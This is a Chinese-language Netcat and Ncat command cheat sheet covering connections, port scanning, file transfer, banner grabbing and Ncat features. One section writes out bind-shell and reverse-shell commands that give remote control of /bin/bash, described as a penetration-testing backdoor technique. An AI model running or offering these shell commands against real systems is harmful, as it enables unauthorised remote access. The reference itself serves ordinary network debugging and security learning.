Netcat 的强大在于其参数的组合。由于目前主流 Linux 发行版（如 Ubuntu, CentOS）和安全工具（如 Nmap）自带的版本略有差异，以下命令以最通用的 **OpenBSD 版** 和功能最强的 **Ncat (Nmap 版)** 为主。


## 1. 基础连接与监听

- **连接到远程端口：**
    `nc [目标IP] [端口号]`
    _示例：_ `nc 192.168.1.1 80` 连接到接收方的 80 端口
    
- **监听本地端口：**
    `nc -l -p [端口号]`
    _示例：_ `nc -l -p 8888` (等待外部连接)
    
- **指定超时时间：**
    `nc -w [秒] [IP] [端口]` (连接超过指定秒数未果则退出)
    
---

## 2. 端口扫描

虽然 `nmap` 更专业，但 `nc` 胜在无需额外安装，适合快速排查。

- **扫描指定端口范围 (TCP)：**
    
    `nc -zv [目标IP] [起始端口]-[结束端口]`
    - `-z`: 扫描模式，不发送数据。        
    - `-v`: 显示详细过程 (Verbose)。
        
- **扫描 UDP 端口：**
    `nc -zuv [目标IP] [端口]`
    
- **混合扫描 (跳过 DNS 反向解析以提速)：**
    `nc -znv [目标IP] [端口]`
    

---

## 3. 文件传输 (File Transfer)

Netcat 可以像管道一样传输任何二进制流，无需 FTP/SCP。

- **接收端 (先启动)：**
    `nc -l [端口] > [保存的文件名]`
    
- **发送端 (后启动)：**
    `nc [接收端IP] [端口] < [待发送文件名]`
    
- **传输目录 (配合 tar)：**
    - 接收端：`nc -l 1234 | tar xvf -`
    - 发送端：`tar cvf - [目录名] | nc [接收端IP] 1234`
        

---

## 4. 网络调试与信息抓取

- **获取 Banner 信息 (识别服务版本)：**
    `echo "EXIT" | nc -vn [目标IP] [端口]`
    
- **作为简单的即时聊天：**
    
    - A机：`nc -l 9999`
    - B机：`nc [A机IP] 9999`
    - 此时两边输入文字，回车后对方即可看到。
        
- **模拟 HTTP 服务器：**
    `while true; do { echo -e 'HTTP/1.1 200 OK\r\n\r\n Hello World'; } | nc -l -p 8080; done`
    

---

## 5. 进阶：后门与反弹 Shell 
这是渗透测试中 `nc` 最著名的用法。

- **正向 Shell (Bind Shell)：** 将本地 Bash 绑定到端口，任何人连上来都能控制。
    
    `nc -l -p 4444 -e /bin/bash`
    
- **反弹 Shell (Reverse Shell)：** 让受控端主动连接控制端（穿透防火墙常用）。
    
    1. 控制端监听：`nc -lvp 5555`
    2. 受控端连接：`nc [控制端IP] 5555 -e /bin/bash`
        

> **注意：** 现代很多 Linux 发行版的 `nc` 出于安全删除了 `-e` 参数。如果是这种情况，可以使用 Ncat 或管道替代。

---

## 6. Ncat (Nmap 版) 独有高级功能

如果你安装的是 Nmap 版本的 `ncat`，它支持更现代的特性：

- **加密传输 (SSL)：**
    
    `ncat --ssl -l -p 443` (比普通 nc 更隐蔽且安全)
    
- **访问控制 (白名单)：**
    
    `ncat -l 8080 --allow 192.168.1.100` (仅允许特定 IP 连接)
    
- **代理转发：**
    
    `ncat -x [代理IP]:[端口] [目标IP] [目标端口]`

## 常用参数速查表

| 参数     | 全称           | 说明                |
| ------ | ------------ | ----------------- |
| **-l** | **Listen**   | 监听模式              |
| **-p** | **Port**     | 指定端口              |
| **-v** | **Verbose**  | 显示详细输出            |
| **-u** | **UDP**      | 使用 UDP 协议（默认 TCP） |
| **-z** | **Zero I/O** | 扫描模式，不发送数据        |
| **-n** | **Numeric**  | 不进行 DNS 域名解析      |
| **-w** | **Timeout**  | 设置超时时间            |
| **-e** | **Execute**  | 连接后执行程序（危险参数）     |
| -N     |              | 标准输入结束后，关闭网络套接字   |
